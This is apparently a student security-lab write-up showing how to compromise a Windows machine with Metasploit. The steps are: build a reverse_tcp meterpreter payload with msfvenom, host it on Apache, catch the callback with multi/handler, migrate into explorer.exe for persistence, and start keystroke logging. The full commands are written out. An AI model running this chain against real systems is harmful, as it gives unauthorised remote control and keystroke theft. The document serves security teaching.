# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

### Find the attackers ip address using ifconfig

### OUTPUT: 

![01](https://github.com/user-attachments/assets/c57af2ff-2164-4589-bd54-40398a9fbe74)

### Create a malicious executable file fun.exe using msfvenom command:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

### OUTPUT:
![02](https://github.com/user-attachments/assets/e4920d8c-90b0-44a2-91f8-c46521535fb7)

copy the fun.exe into the apache /var/www/html folder sudo systemctl apache2 start

### Check the status of apache2:

### OUTPUT:
![04](https://github.com/user-attachments/assets/f4f695a4-1ac6-449a-895a-2712e0e72d62)


### Invoke msfconsole:

### OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

### OUTPUT :
![05](https://github.com/user-attachments/assets/882dc545-951d-4061-9bc3-e14e9d0df166)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

### OUTPUT :
![RECENT](https://github.com/user-attachments/assets/b21d0963-6f17-41ab-b587-b0cfca01a503)

### WINDOWS :

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads

### BROWSE OUTPUT :
![G1](https://github.com/user-attachments/assets/2e7aa376-1eaf-42e1-9153-996d56a3029f)

### DOWNLOAD OUTPUT :
![G2](https://github.com/user-attachments/assets/99109ec1-d994-498a-8216-dcfdbdb216ff)

### COME BACK TO PARROT :
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

### OUTPUT:
![og 06](https://github.com/user-attachments/assets/9746d958-5ed4-4572-8817-a109aa8cb561)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

### OUTPUT :
![07](https://github.com/user-attachments/assets/9d05082a-8b7c-4adf-947e-a4a81d96a2c6)

### WINDOWS OUTPUT :
![G3](https://github.com/user-attachments/assets/a001c377-dbc6-4217-bfae-6c836b41787e)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

### OUTPUT : 
![09](https://github.com/user-attachments/assets/307d0a7e-5e57-435d-a9bf-e262fe4a3d91)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
